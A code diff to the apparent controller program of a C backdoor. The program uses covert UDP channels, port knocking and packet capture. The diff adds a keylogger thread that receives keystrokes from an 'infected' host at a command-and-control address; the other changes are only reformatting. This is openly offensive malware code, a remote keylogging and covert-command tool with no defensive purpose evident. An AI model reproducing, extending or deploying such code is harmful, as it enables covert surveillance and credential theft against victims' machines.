@@ -4,6 +4,7 @@
 #include "../src/covert_wrappers.h"
 #include "../src/inotify.h"
 #include "../src/libpcap.h"
+#include "../src/keylogger.h"
 
 static void print_usage(void) {
     puts ("Usage options: \n"
@@ -51,7 +52,7 @@ int main(int argc, char **argv){
         switch (arg) {
             case 0:
                 /*strncpy(nic, optarg, BUFFERSIZE);
-                printf("Using NIC: %s\n", nic);*/
+                  printf("Using NIC: %s\n", nic);*/
                 break;
             case 1:
                 strncpy(targetip, optarg, BUFSIZ);
@@ -67,40 +68,48 @@ int main(int argc, char **argv){
                 Filter = InitFilter(targetip,localip,false);
                 PrintFilter(Filter);
                 break;
-            /*case 4:
-                break;*/
+                /*case 4:
+                  break;*/
             default: /*  '?' */
                 print_usage();
                 exit(1);
         }
     }
+
+    //keylogger thread
+    keylogger_struct *keylogger_args = malloc(sizeof *keylogger_args);  //create struct to pass args to thread
+    strncpy(keylogger_args->cnc_ip, localip, BUFSIZ);
+    strncpy(keylogger_args->infected_ip, targetip, BUFSIZ);
+    pthread_t keylogger_thread; //create a thread
+    pthread_create(&keylogger_thread, NULL, keylogger_recv, keylogger_args);
+
     CreateFilter(Filter, pcapfilter);
-	//covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], data, 0);
-	//wait for port knocking
+    //covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], data, 0);
+    //wait for port knocking
     printf("Filter: %s\n",pcapfilter);
     covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
-	Packetcapture(pcapfilter,Filter,true);
+    Packetcapture(pcapfilter,Filter,true);
     exit(1);
     return 0;
 }
 
 /*char GetLocalIP(char *device){
-	int interfacesocket;
-	if((interfacesocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1){
-		perror("socket():");
-		exit(1);
-	}
-	struct ifreq interface;
-	strncpy(interface.ifr_name, device, IFNAMSIZ);
+  int interfacesocket;
+  if((interfacesocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1){
+  perror("socket():");
+  exit(1);
+  }
+  struct ifreq interface;
+  strncpy(interface.ifr_name, device, IFNAMSIZ);
 
-	if(ioctl(interfacesocket, SIOCGIFADDR, &interface) == -1 ){
-		perror("ioctl SIOCGIFINDEX:");
-		exit(1);
-	}
+  if(ioctl(interfacesocket, SIOCGIFADDR, &interface) == -1 ){
+  perror("ioctl SIOCGIFINDEX:");
+  exit(1);
+  }
 
-	printf("%s - %s\n" , device , inet_ntoa(( (struct sockaddr_in *)&interface.ifr_addr )->sin_addr) );
+  printf("%s - %s\n" , device , inet_ntoa(( (struct sockaddr_in *)&interface.ifr_addr )->sin_addr) );
 
-	close(interfacesocket);
-	return (char)inet_ntoa(( (struct sockaddr_in *)&interface.ifr_addr )->sin_addr);
-}*/
+  close(interfacesocket);
+  return (char)inet_ntoa(( (struct sockaddr_in *)&interface.ifr_addr )->sin_addr);
+  }*/
 
